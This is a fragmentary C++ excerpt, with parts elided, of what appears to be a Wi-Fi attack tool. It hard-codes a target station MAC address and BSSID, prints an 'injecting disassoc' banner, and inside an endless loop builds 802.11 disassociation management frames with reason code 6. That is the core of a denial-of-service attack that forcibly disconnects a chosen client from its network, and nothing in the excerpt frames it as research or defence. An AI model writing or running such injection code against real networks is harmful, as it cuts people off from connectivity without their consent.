...
int main() {
    ...
    uint8_t target_sta[6] = {0xc8, 0xb2, 0x9b, 0x0d, 0x65, 0xe2};
    uint8_t target_bssid[6] = {0x30, 0x30, 0x30, 0x30, 0x30, 0x30};
    ...
    std::cout << "[*] ENGINE ACTIVE -> INJECTING ISOLATED DISASSOC ON INTERFACE: " << wifi_card << "\n";
    ...
    while (true) {
        ...
        uint8_t frame_control[2] = {0xa0, 0x00}; // Type: Management, Subtype: Disassoc
        uint8_t frame_duration[2] = {0x00, 0x00};
        uint8_t drop_reason[2] = {0x06, 0x00};  // Reason 6: Class 2 frame from nonauthenticated STA
